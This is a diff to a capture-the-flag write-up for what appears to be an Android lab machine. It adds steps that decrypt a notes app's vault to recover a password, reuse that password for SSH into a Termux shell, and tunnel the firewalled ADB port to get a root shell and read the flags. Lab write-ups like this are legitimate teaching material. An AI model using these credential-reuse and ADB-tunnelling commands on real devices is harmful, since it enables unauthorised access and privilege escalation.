@@ -166,7 +166,7 @@ image::jadx01.png[]
 
 ==== 4.Understand encryption system
 
-We leave you the choice, either you will search by yourself, or you will continue reading and everything will be ready for you
+We leave you the choice, either you search by yourself, or you continue reading and everything will be ready for you
 
 ===== 1. Important functions 
 
@@ -180,7 +180,7 @@ image::prefssupport.png[]
 
 image::CryptoUtils.svg[]
 
-We have to reproduce the getMasterKey () function +
+We had to reproduce the getMasterKey () function +
 This function will return a key to us, with which we can decrypt the vault's entries ( encrypted with AES ). +
 (If you want more details, go see the code )
 
@@ -197,3 +197,97 @@ TIP: Do not hesitate to follow the diagram with a finger to fully understand
 image::MemorixImpro.png[]
 
 Then, we can call decrypt function , with MASTER_KEY and some text do decrypt and that's all.
+
+==== 5. Make a script
+
+After understanding the code, we had to make a script, because decoding AES on paper, that's too much hard.
+
+So , here is the link:clean.py[script]. We took the time to comment on all of the code to ensure it was understood.
+
+Now, let's use it , that's so simple , you just have to do +
+
+`python script.py notes_db panama.android.notes_preferences.xml --vaultonly` 
+
+--vaultonly parameter tell the script not to display entries that are not in the vault
+
+NOTE: Obviously, you must copy these two files in the same folder as the script
+
+Now, check the result 
+----
+########## MemorixVault ##########
+Dev : 
+switch to key-based auth, for now use password w@ckySystem99 ---------> Not checked
+enable remote access ---------> Checked
+set up backup synchronization ---------> Checked
+----
+
+Nice ! We got a password ! *w@ckySystem99*
+
+=== 6. Use this password
+Remember our ports table : 
+
+[options="header,footer"]
+|=======================
+|Port     |Service    
+|5555     | ADB 
+|8022     |SSH
+|8384     |Syncthing WEB GUI
+|22000    |Syncthing TCP
+|=======================
+
+We had SSH port , let's try our password !
+
+But..We don't have any username ? 
+
+Don't worry , try with whatever you want
+
+`ssh hacker@oreo.local -p 8022`
+
+And we get a Termux shell.
+
+A little whoami and : 
+----
+$ whoami
+u0_a74
+$ id
+uid=10074(u0_a74) gid=10074(u0_a74) groups=3003(inet),9997(everybody),20074(u0_a74_cache),50074(all_a74)
+----
+We are not root :) 
+
+Let's see termux file 
+
+----
+$ ls
+drozer-agent-2.3.4.apk  user.txt
+----
+Oh , the user flag
+
+----
+$ cat user.txt 
+af91f6549d776d17cXXXXXXXXXXXXXXX
+----
+
+Yeees the user flag , but now , how can we become root ?
+
+Remember , the 5555 port , it was protected with a firewall, but do you know the power of ssh ?
+
+In SSH there is something called port forwarding , with this we are able to redirect a remote private port to a local port (among others), through an ssh tunnel.
+
+Let's do it : 
+
+
+`ssh t@192.168.0.77 -p 8022 -L 6666:127.0.0.1:5555 -N`
+
+This command will map remote port 5555 to local port 6666, let it run in the background
+
+And we just have to connect with adb 
+----
+adb connect 127.0.0.1 6666
+adb shell
+x86_64:/ $ su
+x86_64:/ $ whoami
+root
+x86_64:/ # cat /data/root.txt
+3b4ae23cd7323dedfXXXXXXXXXXXXXXX
+----
+
